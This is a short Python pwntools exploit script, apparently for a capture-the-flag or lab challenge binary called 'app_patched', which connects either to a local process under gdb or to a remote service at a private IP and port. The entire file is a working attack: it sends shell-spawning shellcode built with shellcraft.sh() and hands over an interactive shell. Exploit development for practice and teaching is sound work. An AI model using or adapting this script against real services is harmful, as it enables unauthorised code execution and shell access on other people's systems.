#!/usr/bin/env python3

from pwn import *

exe = ELF("./app_patched")
libc = ELF("./libc.so.6", False)
ld = ELF("./ld-linux-x86-64.so.2", False)

context.binary = exe
gdb_script = '''

b *forbidden+153
b *main+197
c
'''

#b *forbidden+48
#b *forbidden+88
#b *forbidden+110

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("10.10.197.85", 9008)

    return r


def main():
    r = conn()

    print(hex(exe.plt.puts))

    shellcode = asm(shellcraft.sh())
    
    r.sendline(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
